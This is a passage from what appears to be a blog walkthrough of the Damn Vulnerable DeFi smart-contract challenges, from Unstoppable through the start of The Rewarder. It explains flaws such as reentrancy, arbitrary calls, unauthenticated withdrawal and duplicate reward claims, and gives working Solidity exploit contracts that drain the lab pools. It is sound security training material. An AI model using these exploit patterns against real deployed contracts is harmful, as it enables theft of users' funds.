        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256(&quot;IERC3156FlashBorrower.onFlashLoan&quot;)
        ) {
            revert CallbackFailed();
        }
        // ....</code></pre>
<p>The <code>revert InvalidAmount(0)</code>, <code>revert UnsupportedCurrency()</code>, and <code>revert CallbackFailed()</code> statements are not parts of the challenge that the player can deliberately manipulate. Instead, they serve more as basic integrity checks (sanity checks) to ensure the function behaves correctly under normal conditions. Therefore, our real objective is to trigger the <code>revert InvalidBalance()</code> statement.  </p>
<pre><code class="hljs solidity">// UnstoppableVault.totalAssets
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}

// ERC4626.convertToShares
function convertToShares(uint256 assets) public view virtual returns (uint256) {
    uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
    return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
}</code></pre>
<p>The <code>totalAssets()</code> function returns the total amount of assets (balance) currently held by the <code>UnstoppableVault</code> contract. The <code>convertToShares()</code> function may look a bit more complex since it involves arithmetic operations, but in practice, it can be interpreted as follows.  </p>
<pre><code class="hljs solidity">convertToShares(totalSupply) 
= (totalSupply * totalSupply) / totalAssets()</code></pre>
<p>Here, <code>totalSupply</code> refers to the total assets issued by the ERC20 token. It increases when tokens are minted (<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC4626-mint-uint256-address-">mint</a>) and decreases when they are burned (<a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.openzeppelin.com/contracts/5.x/api/token/erc20#ERC20-_burn-address-uint256-">burn</a>).  </p>
<pre><code class="hljs solidity">	  // ERC20._mint
    function _mint(address to, uint256 amount) internal virtual {
        totalSupply += amount;
        
.....
		// ERC20._burn
    function _burn(address from, uint256 amount) internal virtual {
        // ....
        unchecked {
            totalSupply -= amount;
        }</code></pre>
<p>Looking at the initial setup (<code>setUp()</code> function) of the challenge, an amount equal to <code>TOKEN_IN_VAULT</code> is deposited into the <code>vault</code>. During this process, the amount deposited in the <code>vault</code> (<code>totalAssets</code>) and the total supply of tokens issued (<code>totalSupply</code>) both become equal to the value of <code>TOKEN_IN_VAULT</code>.  </p>
<pre><code class="hljs solidity">    // UnstoppableChallenge.setUp
        token.approve(address(vault), TOKENS_IN_VAULT);
        vault.deposit(TOKENS_IN_VAULT, address(deployer));
        
// ....

    // ERC4626._deposit
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual {
        // If _asset is ERC-777, `transferFrom` can trigger a reentrancy BEFORE the transfer happens through the
        // `tokensToSend` hook. On the other hand, the `tokenReceived` hook, that is triggered after the transfer,
        // calls the vault, which is assumed not malicious.
        //
        // Conclusion: we need to do the transfer before we mint so that any reentrancy would happen before the
        // assets are transferred and before the shares are minted, which is a valid state.
        // slither-disable-next-line reentrancy-no-eth
        SafeERC20.safeTransferFrom(_asset, caller, address(this), assets);
        _mint(receiver, shares);

        emit Deposit(caller, receiver, assets, shares);
    }</code></pre>
<h3 id="Challenge-Solving"><a href="#Challenge-Solving" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h3><p>At the start, both <code>totalSupply</code> (the amount of tokens minted by the <code>token</code>) and <code>totalAssets()</code> (the amount deposited in the <code>vault</code>) are equal to <code>TOKEN_IN_VAULT</code>. Because of this, <code>convertToShares(totalSupply)</code> returns <code>TOKEN_IN_VAULT</code>, and <code>totalAssets()</code> also returns <code>TOKEN_IN_VAULT</code>, making them identical.  </p>
<p>However, this condition is not guaranteed to always hold true. What happens if someone transfers tokens directly to the <code>vault</code> address? In that case, the actual assets held by the <code>vault</code> (<code>totalAssets</code>) increase, but the total supply of tokens (<code>totalSupply</code>) remains unchanged. This discrepancy causes the condition <code>convertToShares(totalSupply) != balanceBefore</code> to become true.  </p>
<p>Therefore, simply sending even a very small amount of tokens directly to the <code>vault</code> contract address is enough to solve the challenge.  </p>
<pre><code class="hljs solidity">function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 1);
}</code></pre>
<h2 id="2-Naive-Receiver-flash-loan-with-fixed-fee"><a href="#2-Naive-Receiver-flash-loan-with-fixed-fee" class="headerlink" title="2. Naive Receiver: flash loan with fixed fee"></a>2. Naive Receiver: flash loan with fixed fee</h2><h3 id="Challenge-Explanation-1"><a href="#Challenge-Explanation-1" class="headerlink" title="Challenge Explanation"></a>Challenge Explanation</h3><p>The objective of this challenge is to drain all the assets from both the <code>receiver</code> and the <code>pool</code>, and then transfer them to the <code>recovery</code>, using no more than two transaction calls.  </p>
<p>(<strong>Just FYI, in this context, the term </strong>transaction** refers to invoking functions that are defined in other contracts.)  </p>
<pre><code class="hljs solidity">function _isSolved() private view {
    // Player must have executed two or less transactions
    assertLe(vm.getNonce(player), 2);

    // The flashloan receiver contract has been emptied
    assertEq(weth.balanceOf(address(receiver)), 0, &quot;Unexpected balance in receiver contract&quot;);

    // Pool is empty too
    assertEq(weth.balanceOf(address(pool)), 0, &quot;Unexpected balance in pool&quot;);

    // All funds sent to recovery account
    assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, &quot;Not enough WETH in recovery account&quot;);
}</code></pre>
<p>The <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L43">pool.flashLoan()</a> function, as its name suggests, provides an unsecured loan (flash loan) service to the <code>receiver</code>, and charges a fixed fee of <code>FIXED_FEE</code> (<code>1 ether</code>) as compensation.  </p>
<p>(Just FYI, <code>1e18</code> = <code>1 ether</code>)  </p>
<pre><code class="hljs solidity">function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
    external
    returns (bool)
{
    if (token != address(weth)) revert UnsupportedCurrency();

    // Transfer WETH and handle control to receiver
    weth.transfer(address(receiver), amount);
    totalDeposits -= amount;

    if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
        revert CallbackFailed();
    }

    uint256 amountWithFee = amount + FIXED_FEE;
    weth.transferFrom(address(receiver), address(this), amountWithFee);
    totalDeposits += amountWithFee;

    deposits[feeReceiver] += FIXED_FEE;

    return true;
}</code></pre>
<h3 id="Challenge-Solving-1"><a href="#Challenge-Solving-1" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h3><p>The key is that by repeatedly calling the <code>flashLoan</code> function, the fixed fee <code>FIXED_FEE</code> can be exploited to gradually transfer all of the <code>receiver</code>&#x2019;s assets into the <code>pool</code>. This process is repeated until the <code>receiver</code>&#x2019;s balance is completely drained.  </p>
<p>After that, looking at the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/NaiveReceiverPool.sol#L66">pool.withdraw()</a> function, you&#x2019;ll notice that <strong>there are no authorization checks when withdrawing assets.</strong> This allows us to easily withdraw all the assets accumulated in the <code>pool</code> and send them to any address we want.  </p>
<pre><code class="hljs solidity">function withdraw(uint256 amount, address payable receiver) external {
    // Reduce deposits
    deposits[_msgSender()] -= amount;
    totalDeposits -= amount;

    // Transfer ETH to designated receiver
    weth.transfer(receiver, amount);
}</code></pre>
<p>This challenge must be solved with no more than two transactions. To achieve this, you can use the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/naive-receiver/Multicall.sol#L9">MultiCall.multicall()</a> function, which allows multiple function calls to be bundled together and executed within a single transaction.  </p>
<pre><code class="hljs solidity">function multicall(bytes[] calldata data) external virtual returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i &lt; data.length; i++) {
        results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
    return results;
}</code></pre>
<p>In the final step of the solution, we use the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/98028bbbc32c189b99241ba993d69d3517837e29/src/naive-receiver/BasicForwarder.sol#L55">BasicForwarder.execute()</a> function. The <code>BasicForwarder</code> contract supports <a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.alchemy.com/overviews/meta-transactions">meta transactions</a>, which allow gas fees to be paid on behalf of the user.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image4.png" srcset="/img/loading.gif" alt>  </p>
<p>In this challenge, to successfully withdraw all the assets from the <code>pool</code>, the <code>_msgSender()</code> must return the <code>deployer</code>&#x2019;s address when the <code>withdraw</code> function is called. By using <code>BasicForwarder</code>, we can satisfy this condition.  </p>
<p>(Just FYI, a <strong>gas fee</strong> refers to the fee paid whenever a transaction is recorded on the blockchain&#x2014;such as when calling a smart contract function&#x2014;on the actual mainnet.)  </p>
<pre><code class="hljs solidity">// NaiveReceiverPool.sol
function _msgSender() internal view override returns (address) {
    if (msg.sender == trustedForwarder &amp;&amp; msg.data.length &gt;= 20) {
        return address(bytes20(msg.data[msg.data.length - 20:]));
    } else {
        return super._msgSender();
    }
}

// BasicForwarder.sol
function execute(Request calldata request, bytes calldata signature) public payable returns (bool success) {
    _checkRequest(request, signature);

    nonces[request.from]++;

    uint256 gasLeft;
    uint256 value = request.value; // in wei
    address target = request.target;
    bytes memory payload = abi.encodePacked(request.data, request.from);
    uint256 forwardGas = request.gas;
    assembly {
        success := call(forwardGas, target, value, add(payload, 0x20), mload(payload), 0, 0) // don&apos;t copy returndata
        gasLeft := gas()
    }

    if (gasLeft &lt; request.gas / 63) {
        assembly {
            invalid()
        }
    }
}</code></pre>
<p>The final attack flow can be summarized as follows:</p>
<ol>
<li><p>Use the <code>multicall</code> function to call the <code>flashLoan</code> function 10 times, draining all of the <code>receiver</code>&#x2019;s assets into the <code>pool</code>. Then, immediately call the <code>withdraw</code> function to transfer all the funds from the <code>pool</code> into the <code>recovery</code> account.  </p>
</li>
<li><p>Execute the entire process through <code>BasicForwarder</code>, ensuring that everything is handled within a single transaction.  </p>
</li>
</ol>
<pre><code class="hljs solidity">function test_naiveReceiver() public checkSolvedByPlayer {
    bytes[] memory call_datas = new bytes[](11);
    // WETH_IN_RECEIVER = 10e18
    // FIXED_FEE = 1e8
    // calling flashLoan 10 times
    for(uint i = 0; i &lt; 10; i++) {
        call_datas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 9e18, &quot;&quot;));
    }

		// deposits[deployer] -= WETH_IN_POOL + WETH_IN_RECEIVER;
		// weth.transfer(recovery, WETH_IN_POOL + WETH_IN_RECEIVER);
    call_datas[10] = abi.encodePacked(
        abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
        bytes20(uint160(deployer))
    );

    bytes memory call_data = abi.encodeCall(Multicall.multicall, call_datas);

    BasicForwarder.Request memory request = BasicForwarder.Request({
        from: player,
        target: address(pool),
        value: 0,
        gas: gasleft(),
        nonce: forwarder.nonces(player),
        data: call_data,
        deadline: block.timestamp + 1 days
    });

    // creating hash for request
    bytes32 request_hash = keccak256(
        abi.encodePacked(
            &quot;\x19\x01&quot;, // == EIP-712 signature, because BasicForwarder is EIP712
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );

    // r = 1st part of signature
    // s = 2nd part of signature
    // v = recovery ID
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request_hash);
    bytes memory signature = abi.encodePacked(r,s,v);

    forwarder.execute(request, signature);
}</code></pre>
<h2 id="3-Truster-don&#x2019;t-trust-borrower-too-much"><a href="#3-Truster-don&#x2019;t-trust-borrower-too-much" class="headerlink" title="3. Truster: don&#x2019;t trust borrower too much"></a>3. Truster: don&#x2019;t trust borrower too much</h2><h3 id="Challenge-Explanation-2"><a href="#Challenge-Explanation-2" class="headerlink" title="Challenge Explanation"></a>Challenge Explanation</h3><p>The <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/truster/TrusterLenderPool.sol">TrusterLenderPool.sol</a> contract&#x2019;s <code>flashLoan</code> function provides an unsecured loan to the <code>borrower</code>. What&#x2019;s unusual here is that the logic for how the borrowed funds are used is passed in as the <code>data</code> argument, which is then executed directly through a <a target="_blank" rel="external nofollow noopener noreferrer" href="https://rareskills.io/post/low-level-call-solidity">call</a>.  </p>
<p>After the function call finishes, the pool checks whether its balance (<code>token.balanceOf(address(this))</code>) is less than it was before the loan (<code>balanceBefore</code>). If it is, a <code>revert</code> occurs. In other words, either the loan amount must be <code>0</code>, or the borrowed funds must be repaid within the function passed through the <code>data</code> argument.  </p>
<pre><code class="hljs solidity">// TrusterLenderPool.flashLoan
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) &lt; balanceBefore) {
        revert RepayFailed();
    }

    return true;
}</code></pre>
<h3 id="Challenge-Solving-2"><a href="#Challenge-Solving-2" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h3><p>The key issue here is that the <code>data</code> argument allows us to call <strong>any function</strong>. What happens if we call the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/transmissions11/solmate/blob/34d20fc027fe8d50da71428687024a29dc01748b/src/tokens/ERC20.sol#L68">ERC20.approve()</a> function?  </p>
<p>The <code>approve</code> function sets an <a target="_blank" rel="external nofollow noopener noreferrer" href="https://metaschool.so/articles/what-are-erc20-approve-erc20-allowance-methods">allowance</a>, which defines how many tokens a specific account (<code>spender</code>) is allowed to withdraw from the caller&#x2019;s (<code>msg.sender</code>) account. Importantly, this operation <strong>does not affect the actual balance of the pool</strong>.  </p>
<pre><code class="hljs solidity">// ERC20.approve
function approve(address spender, uint256 amount) public virtual returns (bool) {
    allowance[msg.sender][spender] = amount;

    emit Approval(msg.sender, spender, amount);

    return true;
}</code></pre>
<p>Since increasing the <code>allowance</code> value only expands the withdrawal limit without affecting the actual balance of the <code>pool</code>, the following approach can be taken:</p>
<ul>
<li>Call the <code>flashLoan()</code> function with the loan amount (<code>amount</code>) set to 0.  </li>
<li>Use the <code>data</code> argument to invoke the <code>ERC20.approve()</code> function.  </li>
<li>Pass the <code>if (token.balanceOf(address(this)) &lt; balanceBefore)</code> check, allowing the <code>flashLoan()</code> function to complete successfully.  </li>
</ul>
<p>As a result, the <code>allowance</code> value will be set high enough for the attacker to drain all of the <code>pool</code>&#x2019;s assets.  </p>
<p>The full execution flow looks like this:</p>
<ol>
<li>Call the <code>flashLoan()</code> function, setting the loan amount (<code>amount</code>) to 0.  </li>
<li>Pass the <code>ERC20.approve()</code> call through the <code>data</code> argument, granting the attacker contract permission to withdraw all the <code>pool</code>&#x2019;s assets by adjusting the <code>allowance</code>.  </li>
<li>Since the pool&#x2019;s balance does not change, the <code>flashLoan()</code> function finishes without any issues.  </li>
<li>Using the permission obtained via <code>approve</code>, the attacker then calls <code>transferFrom</code> to drain all the funds from the <code>pool</code>.  </li>
</ol>
<pre><code class="hljs solidity">function test_truster() public checkSolvedByPlayer {
    new TrusterSolver(pool, recovery, token);
}

// ....

contract TrusterSolver {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;
    constructor(TrusterLenderPool pool, address recovery, DamnValuableToken token) {
        // ERC20.approve(address(this), TOKENS_IN_POOL);
        // address(this) &lt;- TrusterSolver contract
        bytes memory approve_call = abi.encodeCall(ERC20.approve, (address(this), TOKENS_IN_POOL));

        // amount = 0
        // borrower = address(this) = TrusterSolver contract
        // target = token
        // target.functionCall = token.functionCall(approve_call);
        pool.flashLoan(0, address(this), address(token), approve_call);

        // pool -&gt; recovery to TOKENS_IN_POOL DVT
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
</code></pre>
<h2 id="4-Side-Entrance-re-enter-the-contract"><a href="#4-Side-Entrance-re-enter-the-contract" class="headerlink" title="4. Side Entrance: re-enter the contract"></a>4. Side Entrance: re-enter the contract</h2><h3 id="Challenge-Explanation-3"><a href="#Challenge-Explanation-3" class="headerlink" title="Challenge Explanation"></a>Challenge Explanation</h3><p>The <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/src/side-entrance/SideEntranceLenderPool.sol#L35">SideEntranceLenderPool.flashLoan()</a> function allows the caller (<code>msg.sender</code>) to borrow any amount of ETH without collateral. After granting the loan, it calls the <code>execute</code> function defined in the <code>msg.sender</code> contract, passing the borrowed amount (<code>amount</code>) as <code>msg.value</code>.  </p>
<pre><code class="hljs solidity">function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance &lt; balanceBefore) {
        revert RepayFailed();
    }
}</code></pre>
<p>The <code>execute</code> function is marked as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function">payable</a>, which means it can receive ETH when invoked. Through the <code>{value: amount}</code> syntax, the caller sends exactly <code>amount</code> of ETH to the callee when the function is executed.  </p>
<pre><code class="hljs solidity">interface IFlashLoanEtherReceiver {
    function execute() external payable;
}</code></pre>
<p>The <code>SideEntranceLenderPool</code> contract also provides deposit (<code>deposit</code>) and withdrawal (<code>withdraw</code>) functions, recording each user&#x2019;s deposits in the <code>balances</code> mapping.  </p>
<p>For example, when the <code>withdraw()</code> function is called, it sends the caller (<code>msg.sender</code>) the amount stored in <code>balances</code> using the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/transmissions11/solmate/blob/50e15bb566f98b7174da9b0066126a4c3e75e0fd/src/utils/SafeTransferLib.sol#L15">SafeTransferLib.safeTransferETH()</a> function.  </p>
<pre><code class="hljs solidity">contract SideEntranceLenderPool {
    mapping(address =&gt; uint256) public balances;
    // ....
    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }</code></pre>
<h3 id="Challenge-Solving-3"><a href="#Challenge-Solving-3" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h3><p>The biggest issue with this contract is that it is vulnerable to a <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/kadenzipfel/smart-contract-vulnerabilities/blob/master/vulnerabilities/reentrancy.md"><strong>Re-entrancy</strong></a> attack. Unlike contracts protected with mechanisms such as <a target="_blank" rel="external nofollow noopener noreferrer" href="https://medium.com/@mayankchhipa007/openzeppelin-reentrancy-guard-a-quickstart-guide-7f5e41ee388f">ReentrancyGuard</a>, this one has no such safeguards.  </p>
<p>As shown in the diagram, when contract A calls a function (<code>flashLoan</code>) of contract B, before the function completes, contract B can call back into contract A&#x2019;s function (<code>execute</code>), and within that function, A can once again call other functions or access objects in contract B to manipulate its state.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image5.png" srcset="/img/loading.gif" alt>  </p>
<p>Personally, I found this type of re-entrancy vulnerability to be very similar to side-effect vulnerabilities in browser JS engines.  </p>
<ul>
<li>Examples of JS engine side-effect vulnerabilities:  <ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32">https://github.com/saelo/cve-2018-4233/blob/master/pwn.js#L27-L32</a>  </li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari">https://www.enki.co.kr/en/media-center/tech-blog/clobber-the-world-endless-side-effect-issue-in-safari</a>  </li>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug">https://github.blog/security/vulnerability-research/getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/#exploiting-the-bug</a>  </li>
</ul>
</li>
</ul>
<p>Just as side-effect bugs are a classic category of browser JS engine vulnerabilities, re-entrancy is one of the most representative vulnerability classes in smart contracts. It&#x2019;s critical to fully understand it.  </p>
<p><img src="/2025/09/07/d4tura/smartcontracts/en/image6.png" srcset="/img/loading.gif" alt>  </p>
<p>The attack scenario is as follows:  </p>
<ol>
<li>From the attacker contract, call the pool&#x2019;s <code>flashLoan()</code> function to borrow all ETH (<code>ETHER_IN_POOL</code>).  </li>
<li>The pool transfers the loan and invokes the attacker contract&#x2019;s <code>execute()</code> function.  </li>
<li>Inside <code>execute()</code>, deposit all borrowed ETH back into the pool using its <code>deposit()</code> function. This results in the borrowed amount being recorded under <code>balances[attacker contract address]</code>.  </li>
<li>Once <code>execute()</code> finishes, control returns to the <code>flashLoan()</code> function. Since the pool&#x2019;s balance is unchanged from before the loan, the <code>RepayFailed()</code> check is not triggered, and the function completes successfully.  </li>
<li>Finally, from the attacker contract, call the pool&#x2019;s <code>withdraw()</code> function to withdraw the amount recorded in <code>balances</code>. This allows the attacker to legally drain the funds and transfer them to <code>recovery</code>.  </li>
</ol>
<pre><code class="hljs solidity">function test_sideEntrance() public checkSolvedByPlayer {
    SideEntranceSolver solver = new SideEntranceSolver(pool, recovery);
    solver.solve();
}

// ....

contract SideEntranceSolver is IFlashLoanEtherReceiver {
    uint256 constant ETHER_IN_POOL = 1000e18;

    SideEntranceLenderPool _pool;
    address _recovery;

    constructor(SideEntranceLenderPool pool, address recovery) {
        _pool = pool;
        _recovery = recovery;
    }

    function solve() public {
        _pool.flashLoan(ETHER_IN_POOL);
        _pool.withdraw();
        payable(_recovery).transfer(ETHER_IN_POOL);
    }

    function execute() external payable override {
		    // send ETHER_IN_POOL to _pool
        _pool.deposit{value: ETHER_IN_POOL}();
    }
    
    // receive() required if payable function exists on contract
    receive() external payable {}
}</code></pre>
<h2 id="5-The-Rewarder-claim-your-reward-s"><a href="#5-The-Rewarder-claim-your-reward-s" class="headerlink" title="5. The Rewarder: claim your reward(s)"></a>5. The Rewarder: claim your reward(s)</h2><h3 id="Challenge-Explanation-4"><a href="#Challenge-Explanation-4" class="headerlink" title="Challenge Explanation"></a>Challenge Explanation</h3><p>This time, instead of offering a flash loan service, the contract provides rewards in the form of <code>DamnValuableToken</code> and <code>WETH</code> to a specific list of addresses.  </p>
<p>The eligible addresses and the corresponding reward amounts are defined as follows:  </p>
<ul>
<li>Distribution of <code>DamnValuableToken</code> rewards is specified in <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/dvt-distribution.json">dvt-distribution.json</a>.  </li>
<li>Distribution of <code>WETH</code> rewards is specified in <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/v4.1.0/test/the-rewarder/weth-distribution.json">weth-distribution.json</a>.  </li>
</ul>
<pre><code class="hljs json"><span class="hljs-comment">// dvt-distribution.json</span>
[
    {
        <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x230abc2a7763e0169b38fbc7d48a5aa7b6245011&quot;</span>,
        <span class="hljs-attr">&quot;amount&quot;</span>: <span class="hljs-number">4665241241345036</span>
    },
    {
        <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2&quot;</span>,
        <span class="hljs-attr">&quot;amount&quot;</span>: <span class="hljs-number">9214418266997362</span>
    },
    {
        <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x328809Bc894f92807417D2dAD6b7C998c1aFdac6&quot;</span>,
        <span class="hljs-attr">&quot;amount&quot;</span>: <span class="hljs-number">2502024387994809</span>
    },
    ...

<span class="hljs-comment">// weth-distribution.json</span>
[
    {
        <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x230abc2a7763e0169b38fbc7d48a5aa7b6245011&quot;</span>,
        <span class="hljs-attr">&quot;amount&quot;</span>: <span class="hljs-number">3726409081682308</span>
    },
    {
        <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x81e46e5cbe296dfc5e9b2df97ec8f24a9a65bec2&quot;</span>,
        <span class="hljs-attr">&quot;amount&quot;</span>: <span class="hljs-number">870420547863448</span>
    },
    {
        <span class="hljs-attr">&quot;address&quot;</span>: <span class="hljs-string">&quot;0x328809Bc894f92807417D2dAD6b7C998c1aFdac6&quot;</span>,
        <span class="hljs-attr">&quot;amount&quot;</span>: <span class="hljs-number">228382988128225</span>
    },
    ...</code></pre>
<p>Looking at the <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/theredguild/damn-vulnerable-defi/blob/8eb38eff704e87c90fe5297b16cdeaec21eed01f/src/the-rewarder/TheRewarderDistributor.sol#L81">TheRewardDistributor.claimRewards()</a> function, you can see that it is implemented to handle multiple reward claims in a single batch. This kind of design&#x2014;accepting multiple requests and processing them within a single transaction&#x2014;is widely adopted in many smart contract implementations to <strong>save on gas fees</strong>.  </p>
<p>By the way, there&#x2019;s a vulnerability hidden in this function. Can you spot it? &#x1F60A;  </p>
<pre><code class="hljs solidity">struct Distribution {
    uint256 remaining;
    uint256 nextBatchNumber;
    mapping(uint256 batchNumber =&gt; bytes32 root) roots;
    mapping(address claimer =&gt; mapping(uint256 word =&gt; uint256 bits)) claims;
}

// ....

// Allow claiming rewards of multiple tokens in a single transaction
function claimRewards(Claim[] memory inputClaims, IERC20[] memory inputTokens) external {
    Claim memory inputClaim;
    IERC20 token;
    uint256 bitsSet; // accumulator
    uint256 amount;

    for (uint256 i = 0; i &lt; inputClaims.length; i++) {
        inputClaim = inputClaims[i];

        uint256 wordPosition = inputClaim.batchNumber / 256;
        uint256 bitPosition = inputClaim.batchNumber % 256;

        if (token != inputTokens[inputClaim.tokenIndex]) {
            if (address(token) != address(0)) {
                if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
            }

            token = inputTokens[inputClaim.tokenIndex];
            bitsSet = 1 &lt;&lt; bitPosition; // set bit at given position
            amount = inputClaim.amount;
        } else {
            bitsSet = bitsSet | 1 &lt;&lt; bitPosition;
            amount += inputClaim.amount;
        }

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }

        bytes32 leaf = keccak256(abi.encodePacked(msg.sender, inputClaim.amount));
        bytes32 root = distributions[token].roots[inputClaim.batchNumber];

        if (!MerkleProof.verify(inputClaim.proof, root, leaf)) revert InvalidProof();

        inputTokens[inputClaim.tokenIndex].transfer(msg.sender, inputClaim.amount);
    }
}

function _setClaimed(IERC20 token, uint256 amount, uint256 wordPosition, uint256 newBits) private returns (bool) {
    uint256 currentWord = distributions[token].claims[msg.sender][wordPosition];
    if ((currentWord &amp; newBits) != 0) return false;

    // update state
    distributions[token].claims[msg.sender][wordPosition] = currentWord | newBits;
    distributions[token].remaining -= amount;

    return true;
}</code></pre>
<h3 id="Challenge-Solving-4"><a href="#Challenge-Solving-4" class="headerlink" title="Challenge Solving"></a>Challenge Solving</h3><p>The <code>_setClaimed()</code> function records whether a reward has already been claimed using a bitmap. However, if you look closely at the logic inside <code>claimRewards()</code>, you&#x2019;ll see that the values for <code>bitsSet</code> (claim record) and <code>amount</code> (claim amount) are continuously accumulated.  </p>
<p>The important detail is that <code>_setClaimed()</code> is only called <strong>at the end of the loop</strong> or <strong>when the type of token being processed changes</strong>, at which point the accumulated claim record is finally stored.  </p>
<pre><code class="hljs solidity">        bitsSet = bitsSet | 1 &lt;&lt; bitPosition;
        amount += inputClaim.amount;

// ....

        // for the last claim
        if (i == inputClaims.length - 1) {
            if (!_setClaimed(token, amount, wordPosition, bitsSet)) revert AlreadyClaimed();
        }
</code></pre>
<p>The problem is that <strong>even if the same reward claim request is submitted multiple times</strong>, the process of accumulating <code>bitsSet</code> (<code>bitsSet | 1 &lt;&lt; bitPosition</code>) does not properly check for duplicates. For example, if the same request is sent five times, the same bit in <code>bitsSet</code> is simply overwritten five times, and no error occurs.  </p>
<p>However, since the <code>transfer</code> operation is executed inside the loop on every iteration, the attacker ends up receiving the reward five times.  </p>
<p>Because the <code>player</code> address is already registered in the reward list for each token, this flaw can be exploited by repeatedly claiming the reward assigned to them, thereby solving the challenge.  </p>
<pre><code class="hljs solidity">function test_theRewarder() public checkSolvedByPlayer {

    // Step 1: search player&apos;s index in DVT list
    Reward[] memory dvtRewards = abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), &quot;/test/the-rewarder/dvt-distribution.json&quot;))), (Reward[]));
    uint256 dvtIndex;
    uint256 dvtAmount;
    for (uint256 i = 0; i &lt; dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            dvtIndex = i;
            console.log(&quot;player = &quot;, dvtRewards[i].beneficiary);
            dvtAmount = dvtRewards[i].amount;
            break;
        }
    }
    require(dvtAmount &gt; 0, &quot;Player not in DVT list&quot;);

    // Step 2: search player&apos;s index in WETH list
